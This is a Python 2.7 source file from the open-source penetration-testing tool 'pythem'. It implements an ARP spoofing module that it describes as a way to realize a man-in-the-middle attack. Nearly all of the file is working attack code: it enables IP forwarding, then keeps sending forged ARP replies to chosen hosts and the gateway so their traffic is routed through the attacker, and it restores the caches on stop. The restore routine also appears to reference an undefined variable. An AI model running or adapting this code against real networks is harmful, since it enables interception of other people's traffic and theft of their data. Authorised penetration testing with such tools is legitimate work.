#!/usr/bin/env python2.7
# coding=UTF-8

# Copyright (c) 2016-2018 Angelo Moura
#
# This file is part of the program pythem
#
# pythem is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

from scapy.all import *
from netaddr import IPNetwork, IPRange, IPAddress, AddrFormatError
import threading
from time import sleep
from utils import *


class ARPspoof(object):
    name = "ARP poisoner spoofer"
    desc = "Use arp spoofing in order to realize a man-in-the-middle attack"
    version = "0.5"

    def __init__(self, gateway, targets, interface, myip, mymac):

        try:
            self.gateway = str(IPAddress(gateway))
        except AddrFormatError as e:
            print "[-] Select a valid IP address as gateway"
        iptables()
        set_ip_forwarding(1)
        self.gateway_mac = None
        self.range = False
        self.targets = self.get_range(targets)
        self.send = True
        self.interval = 3
        self.interface = interface
        self.myip = myip
        self.mymac = mymac
        self.socket = conf.L3socket(iface=self.interface)
        self.socket2 = conf.L2socket(iface=self.interface)

    def start(self):
        t = threading.Thread(name='ARPspoof', target=self.spoof)
        t.setDaemon(True)
        t.start()

    def get_range(self, targets):
        if targets is None:
            print "[!] IP address/range was not specified, will intercept only gateway requests and not replies."
            return None
        try:
            target_list = []
            for target in targets.split(','):
                if '/' in target:
                    self.range = True
                    target_list.extend(list(IPNetwork(target)))
                elif '-' in target:
                    start_addr = IPAddress(target.split('-')[0])
                    try:
                        end_addr = IPAddress(target.split('-')[1])
                        ip_range = IPRange(start_addr, end_addr)
                    except AddrFormatError:
                        end_addr = list(start_addr.words)
                        end_addr[-1] = target.split('-')[1]
                        end_addr = IPAddress('.'.join(map(str, end_addr)))
                        ip_range = IPRange(start_addr, end_addr)
                    target_list.extend(list(ip_range))
                else:
                    target_list.append(IPAddress(target))
            return target_list

        except AddrFormatError:
            sys.exit("[!] Select a valid IP address/range as target")

    def resolve_mac(self, targetip):
        try:
            conf.verb = 0
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=targetip), timeout=2)
            for snd, rcv in ans:
                return str(rcv[Ether].src)
        except socket.gaierror:
            print "[!] Select a valid IP Address as target/gateway, exiting ..."
            exit(0)

    def spoof(self):
        sleep(2)
        while self.send:
            if self.targets is None:
                self.socket2.send(
                    Ether(src=self.mymac, dst="ff:ff:ff:ff:ff:ff") / ARP(hwsrc=self.mymac, psrc=self.gateway,
                                                                         op="is-at"))
            elif self.targets:
                try:
                    self.gateway_mac = self.resolve_mac(self.gateway)
                    while not self.gateway_mac:
                        print "[-] Error: Couldn't retrieve MAC address from gateway, retrying..."
                        self.gateway_mac = self.resolve_mac(self.gateway)
                except KeyboardInterrupt:
                    print "[!] Aborted."
                    set_ip_forwarding(0)
                    self.socket.close()
                    self.socket2.close()
                    return
                for target in self.targets:
                    targetip = str(target)
                    if (targetip != self.myip):
                        targetmac = self.resolve_mac(targetip)
                        if targetmac is not None:
                            try:
                                self.socket.send(ARP(pdst=targetip, psrc=self.gateway, hwdst=targetmac, op="is-at"))
                                self.socket.send(
                                    ARP(pdst=self.gateway, psrc=targetip, hwdst=self.gateway_mac, op="is-at"))
                            except Exception as e:
                                if "Interrupted system call" not in e:
                                    pass
            sleep(self.interval)

    def stop(self):
        try:
            self.gateway_mac = self.resolve_mac(self.gateway)
            while not self.gateway_mac:
                print "[-] Error: Couldn't retrieve MAC address from gateway, retrying..."
                self.gateway_mac = self.resolve_mac(self.gateway)
        except KeyboardInterrupt:
            print "[!] Aborted."
            set_ip_forwarding(0)
            self.socket.close()
            self.socket2.close()
            return
        self.send = False
        sleep(1)
        count = 4
        if self.targets is None or self.range:
            print "[*] Restoring sub-net connection with {} packets".format(count)
            pkt = Ether(src=self.gateway_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(hwsrc=self.gateway_mac, psrc=self.gateway,
                                                                             op="is-at")
            for i in range(0, count):
                self.socket2.send(pkt)
            set_ip_forwarding(0)
            self.socket.close()
            self.socket2.close()
            return
        elif self.targets:
            for target in self.targets:
                target_ip = str(target)
                target_mac = self.resolve_mac(target_ip)
                if target_mac is not None:
                    print "[+] Restoring connection {} <--> {} with {} packets for host".format(target_ip, self.gateway,
                                                                                                count)
                    try:
                        for i in range(0, count):
                            self.socket2.send(
                                Ether(src=target_mac, dst='ff:ff:ff:ff:ff:ff') / ARP(op="is-at", pdst=self.gateway,
                                                                                     psrc=targetip,
                                                                                     hwdst="ff:ff:ff:ff:ff:ff",
                                                                                     hwsrc=target_mac))
                            self.socket2.send(
                                Ether(src=self.gateway_mac, dst='ff:ff:ff:ff:ff:ff') / ARP(op="is-at", pdst=targetip,
                                                                                           psrc=self.gateway,
                                                                                           hwdst="ff:ff:ff:ff:ff:ff",
                                                                                           hwsrc=self.gateway_mac))
                    except Exception as e:
                        if "Interrupted system call" not in e:
                            pass
            set_ip_forwarding(0)
            self.socket.close()
            self.socket2.close()
            return
